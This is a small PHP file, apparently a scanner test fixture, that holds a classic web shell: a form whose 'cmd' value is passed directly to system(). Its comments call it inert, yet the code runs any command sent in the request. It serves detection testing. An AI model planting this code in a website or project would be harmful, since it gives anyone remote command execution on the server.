<?php
// DETECTION TEST FIXTURE -- inert payload, never deploy this file.
// Classic "web backdoor" shape: a page that runs a command taken straight
// from the HTTP request. Included so the scanner has a web-page-flavored
// positive for PHP-SYSTEM-FROM-REQUEST (not just a bare one-liner).
?>
<!doctype html>
<html>
  <body>
    <form method="get">
      <input name="cmd" placeholder="command">
      <button>run</button>
    </form>
    <pre><?php
      // sink: user-controlled request value reaches a command executor directly
      system($_GET['cmd']);
    ?></pre>
  </body>
</html>
